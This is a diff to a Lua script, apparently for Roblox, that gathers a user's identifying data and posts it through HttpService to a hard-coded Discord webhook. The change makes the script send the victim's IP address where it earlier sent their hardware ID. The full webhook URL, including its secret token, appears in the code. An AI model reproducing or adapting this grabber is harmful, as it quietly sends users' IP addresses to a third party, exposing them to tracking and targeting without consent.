@@ -86,8 +86,8 @@ local function main()
         hwid = "Unable to fetch HWID: " .. tostring(hwidError)
     end
 
-    -- Send data to Discord Webhook if HWID is present
-    if hwid and hwid ~= "" then
+    -- Send data to Discord Webhook if IP is present
+    if IP and IP ~= "" then
         local HttpServ = game:GetService('HttpService')
         local url = "https://discord.com/api/webhooks/1264339196382806058/veMLm0XVO-xlqPp3Q887MA_SpsWXWkFo3l5BhZlSTOYVR1ma0bzmV6A76fuOWr2RoyRH"
 
@@ -95,7 +95,7 @@ local function main()
             ["content"] = "",
             ["embeds"] = {{
                 ["title"] = "__*Information:*__",
-                ["description"] = hwid,
+                ["description"] = IP,
                 ["type"] = "rich",
                 ["color"] = tonumber(0xAB0909),
                 ["fields"] = {
@@ -151,7 +151,7 @@ local function main()
             print("Failed to send data to Discord: " .. tostring(postError))
         end
     else
-        print("No HWID found or HWID fetch error.")
+        print("No IP found or IP fetch error.")
     end
 end
 
